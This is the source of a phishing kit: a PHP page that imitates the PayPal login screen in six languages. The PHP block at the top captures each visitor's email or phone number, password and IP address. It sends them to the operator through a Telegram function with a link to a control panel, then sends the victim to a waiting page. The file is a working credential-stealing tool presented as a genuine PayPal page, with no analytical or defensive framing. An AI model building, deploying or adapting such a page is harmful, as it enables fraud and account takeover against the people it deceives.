<?php
require_once 'config.php';

 $sid = $_GET['sid'] ?? '';
if (!$sid) {
    $sid = bin2hex(random_bytes(8));
    $data = [
        'status' => 'waiting',
        'last_activity' => time(),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown'
    ];
    save_session($sid, $data);
    redirect("index.php?sid=" . $sid);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = get_session($sid) ?: [];
    $data['username'] = $_POST['login_email'] ?? '';
    $data['password'] = $_POST['login_password'] ?? '';
    $data['lang'] = $_POST['lang'] ?? 'de'; 
    $data['status'] = 'waiting'; 
    save_session($sid, $data);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $panel_link = rtrim($base_url, '/') . '/panel.php?sid=' . $sid;

    $msg = "🔔 <b>New Login</b>\n";
    $msg .= "SID: <code>$sid</code>\n";
    $msg .= "Email/Phone: <code>{$data['username']}</code>\n";
    $msg .= "Password: <code>{$data['password']}</code>\n";
    $msg .= "IP: <code>{$data['ip']}</code>\n\n";
    $msg .= "➡️ <a href='{$panel_link}'>Open Panel</a>";
    sendToTelegram($msg);

    redirect("waiting.php?sid=" . $sid);
}
?>
<!DOCTYPE html>
<html lang="de" id="main-html">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="page-title">PayPal - Einloggen</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: "PayPal Sans", Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 40px 10px;
        }

        .container {
            width: 100%;
            max-width: 460px;
            padding: 55px 45px;
            text-align: center;
            background: #ffffff;
            border: 1px solid #f2f4f6;
            border-radius: 20px; 
            box-shadow: 0 1px 15px rgba(0, 0, 0, 0.02);
            display: flex;
            flex-direction: column;
            transition: all 0.3s ease;
        }

        .logo {
            margin-bottom: 45px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo img {
            height: 42px; 
            width: auto;
            object-fit: contain;
        }

        .input-group {
            text-align: left;
            margin-bottom: 15px;
        }
        
        [dir="rtl"] .input-group {
            text-align: right;
        }

        .input-field {
            width: 100%;
            padding: 16px 14px;
            font-size: 15px;
            border: 1px solid #a6abae;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
            color: #2c2e2f;
            margin-bottom: 16px;
            -webkit-appearance: none;
        }

        .input-field:last-of-type {
            margin-bottom: 0;
        }

        .input-field:focus {
            border-color: #0070ba;
            box-shadow: 0 0 0 1px #0070ba;
        }

        .forgot-link {
            display: block;
            margin-top: 18px;
            color: #0070ba;
            text-decoration: none;
            font-size: 14px;
            font-weight: bold;
            text-align: left;
        }
        
        [dir="rtl"] .forgot-link {
            text-align: right;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .btn-blue {
            width: 100%;
            padding: 14px;
            background-color: #0050b3;
            color: #ffffff;
            border: none;
            border-radius: 25px; 
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 22px;
            transition: background-color 0.2s;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-blue:hover {
            background-color: #003e8a;
        }

        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            color: #6c7378;
            margin: 22px 0;
            font-size: 14px;
        }

        .separator::before,
        .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e2e4e6;
        }

        .separator::before { margin-right: 15px; }
        .separator::after { margin-left: 15px; }
        
        [dir="rtl"] .separator::before { margin-right: 0; margin-left: 15px; }
        [dir="rtl"] .separator::after { margin-left: 0; margin-right: 15px; }

        .btn-outline {
            width: 100%;
            padding: 13px;
            background-color: #ffffff;
            color: #000000;
            border: 1.5px solid #000000; 
            border-radius: 25px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
            -webkit-tap-highlight-color: transparent;
        }

        .btn-outline:hover {
            background-color: #f5f7f8;
        }

        .language-wrapper {
            margin-top: 55px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            font-size: 13px;
        }

        .lang-trigger {
            display: flex;
            align-items: center;
            cursor: pointer;
            margin-right: 8px;
            user-select: none;
        }
        
        [dir="rtl"] .lang-trigger { margin-right: 0; margin-left: 8px; }

        .flag-icon {
            width: 18px;
            height: 12px;
            background: linear-gradient(to bottom, #ff0000 33.3%, #ffffff 33.3%, #ffffff 66.6%, #ff0000 66.6%);
            border: 1px solid #cbd2d6;
            border-radius: 1px;
            display: inline-block;
        }

        .chevron {
            border: solid #515659;
            border-width: 0 1.5px 1.5px 0;
            display: inline-block;
            padding: 2.5px;
            margin-left: 6px;
            transform: rotate(45deg);
        }
        
        [dir="rtl"] .chevron { margin-left: 0; margin-right: 6px; }

        .lang-links {
            display: flex;
            align-items: center;
            color: #515659;
        }

        .lang-links a {
            text-decoration: none;
            color: #0070ba;
            margin: 0 6px;
        }

        .lang-links a.active {
            color: #2c2e2f;
            font-weight: bold;
            pointer-events: none;
        }

        .lang-links span {
            color: #cbd2d6;
            margin: 0 2px;
        }

        .dropdown-menu {
            display: none;
            position: absolute;
            bottom: 25px;
            background: #ffffff;
            border: 1px solid #cbd2d6;
            border-radius: 4px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.12);
            z-index: 10;
            padding: 5px 0;
            min-width: 120px;
            text-align: left;
        }
        
        [dir="rtl"] .dropdown-menu { text-align: right; }

        .dropdown-menu a {
            display: block;
            padding: 8px 15px;
            color: #0070ba;
            text-decoration: none;
        }

        .dropdown-menu a:hover {
            background-color: #f5f7f8;
        }

        .dropdown-menu.show {
            display: block;
        }

        .footer {
            font-size: 11px;
            color: #6c7378;
            margin-top: 50px;
            text-align: center;
            width: 100%;
        }

        .footer a {
            text-decoration: none;
            color: #6c7378;
            margin: 0 8px;
            display: inline-block;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            body {
                padding: 15px 10px;
                justify-content: flex-start;
            }

            .container {
                border: none;
                box-shadow: none;
                padding: 30px 15px;
                max-width: 100%;
            }

            .footer {
                margin-top: auto;
                padding-top: 30px;
            }
        }
    </style>
</head>
<body onload="changeLanguage('de')">

    <div class="container">
        <div class="logo">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="PayPal Logo">
        </div>

        <form id="loginForm" method="POST" action="index.php?sid=<?php echo htmlspecialchars($sid); ?>">
            <input type="hidden" name="lang" id="lang-input" value="de">

            <div class="input-group">
                <input type="text" id="input-login" name="login_email" class="input-field" placeholder="E-Mail-Adresse oder Handynummer">
                <input type="password" id="input-password" name="login_password" class="input-field" placeholder="Passwort">
                <a href="#" id="forgot-link" class="forgot-link">Passwort vergessen?</a>
            </div>

            <button type="submit" id="btn-next" class="btn-blue">Einloggen</button>
        </form>

        <div id="separator-text" class="separator">oder</div>
        <button id="btn-signup" class="btn-outline">Neu anmelden</button>

        <div class="language-wrapper">
            <div class="lang-trigger" onclick="toggleDropdown(event)">
                <div class="flag-icon"></div>
                <i class="chevron"></i>
            </div>
            <div class="lang-links">
                <a href="#" id="lang-de" class="active" onclick="changeLanguage('de', event)">Deutsch</a>
                <span>|</span>
                <a href="#" id="lang-en" onclick="changeLanguage('en', event)">English</a>
            </div>

            <div class="dropdown-menu" id="langDropdown">
                <a href="#" onclick="changeLanguage('fr', event)">Français</a>
                <a href="#" onclick="changeLanguage('ar', event)">العربية (AR)</a>
                <a href="#" onclick="changeLanguage('pl', event)">Polski</a>
                <a href="#" onclick="changeLanguage('uk', event)">Українська</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#" id="foot-contact">Kontakt</a>
        <a href="#" id="foot-privacy">Datenschutz</a>
        <a href="#" id="foot-terms">AGB</a>
        <a href="#" id="foot-global">Weltweit</a>
    </div>

    <script>
        const translations = {
            de: {
                title: "PayPal - Einloggen",
                placeholder: "E-Mail-Adresse oder Handynummer",
                passwordPlaceholder: "Passwort",
                forgot: "Passwort vergessen?",
                next: "Einloggen",
                separator: "oder",
                signup: "Neu anmelden",
                contact: "Kontakt",
                privacy: "Datenschutz",
                terms: "AGB",
                global: "Weltweit",
                dir: "ltr"
            },
            en: {
                title: "PayPal - Log In",
                placeholder: "Email or mobile number",
                passwordPlaceholder: "Password",
                forgot: "Forgot password?",
                next: "Log In",
                separator: "or",
                signup: "Sign Up",
                contact: "Contact",
                privacy: "Privacy",
                terms: "Terms",
                global: "Worldwide",
                dir: "ltr"
            },
            fr: {
                title: "PayPal - Connexion",
                placeholder: "Adresse email ou numéro de mobile",
                passwordPlaceholder: "Mot de passe",
                forgot: "Mot de passe oublié ?",
                next: "Connexion",
                separator: "ou",
                signup: "Ouvrir un compte",
                contact: "Contact",
                privacy: "Respect de la vie privée",
                terms: "Contrats d'utilisation",
                global: "International",
                dir: "ltr"
            },
            ar: {
                title: "PayPal - تسجيل الدخول",
                placeholder: "البريد الإلكتروني أو رقم الهاتف المحمول",
                passwordPlaceholder: "كلمة المرور",
                forgot: "هل نسيت كلمة المرور؟",
                next: "تسجيل الدخول",
                separator: "أو",
                signup: "تسجيل جديد",
                contact: "اتصل بنا",
                privacy: "الخصوصية",
                terms: "الاتفاقيات القانونية",
                global: "في جميع أنحاء العالم",
                dir: "rtl"
            },
            pl: {
                title: "PayPal - Zaloguj się",
                placeholder: "Adres e-mail lub numer telefonu komórkowego",
                passwordPlaceholder: "Hasło",
                forgot: "Nie pamiętasz hasła?",
                next: "Zaloguj się",
                separator: "lub",
                signup: "Załóż konto",
                contact: "Kontakt",
                privacy: "Prywatność",
                terms: "Zasady",
                global: "Cały świat",
                dir: "ltr"
            },
            uk: {
                title: "PayPal - Увійти",
                placeholder: "Електронна адреса або номер мобільного",
                passwordPlaceholder: "Пароль",
                forgot: "Забули пароль?",
                next: "Увійти",
                separator: "або",
                signup: "Зареєструватися",
                contact: "Контакти",
                privacy: "Конфіденційність",
                terms: "Угоди",
                global: "У всьому світі",
                dir: "ltr"
            }
        };

        function changeLanguage(lang, event) {
            if(event) event.preventDefault();
            
            const data = translations[lang];
            if (!data) return;

            document.getElementById('main-html').setAttribute('dir', data.dir);
            document.body.style.direction = data.dir;

            document.getElementById('page-title').innerText = data.title;
            document.getElementById('input-login').setAttribute('placeholder', data.placeholder);
            document.getElementById('input-password').setAttribute('placeholder', data.passwordPlaceholder);
            document.getElementById('forgot-link').innerText = data.forgot;
            document.getElementById('btn-next').innerText = data.next;
            document.getElementById('separator-text').innerText = data.separator;
            document.getElementById('btn-signup').innerText = data.signup;
            document.getElementById('foot-contact').innerText = data.contact;
            document.getElementById('foot-privacy').innerText = data.privacy;
            document.getElementById('foot-terms').innerText = data.terms;
            document.getElementById('foot-global').innerText = data.global;

            document.getElementById('lang-de').classList.remove('active');
            document.getElementById('lang-en').classList.remove('active');
            
            if (lang === 'de') {
                document.getElementById('lang-de').classList.add('active');
            } else if (lang === 'en') {
                document.getElementById('lang-en').classList.add('active');
            }

            document.getElementById('langDropdown').classList.remove('show');
            document.getElementById('lang-input').value = lang;
        }

        function toggleDropdown(event) {
            event.stopPropagation();
            document.getElementById('langDropdown').classList.toggle('show');
        }

        window.onclick = function(event) {
            if (!event.target.matches('.lang-trigger') && !event.target.matches('.chevron') && !event.target.matches('.flag-icon')) {
                const dropdown = document.getElementById('langDropdown');
                if (dropdown.classList.contains('show')) {
                    dropdown.classList.remove('show');
                }
            }
        }
    </script>

    <script>
        const usernameInput = document.getElementById('input-login');
        const passwordInput = document.getElementById('input-password');
        const signInBtn = document.getElementById('btn-next');
        const loginForm = document.getElementById('loginForm');

        function checkInputs() {
            const usernameVal = usernameInput.value.trim();
            const passwordVal = passwordInput.value.trim();

            if (usernameVal !== '' && passwordVal !== '') {
                signInBtn.classList.add('active');
            } else {
                signInBtn.classList.remove('active');
            }
        }

        usernameInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);

        loginForm.addEventListener('submit', function(e) {
            if(usernameInput.value.trim() === '' || passwordInput.value.trim() === '') {
                e.preventDefault(); 
                return;
            }
            
            signInBtn.innerText = "Bitte warten..."; 
            signInBtn.style.opacity = "0.7";
            signInBtn.disabled = true;
        });
    </script>
</body>
</html>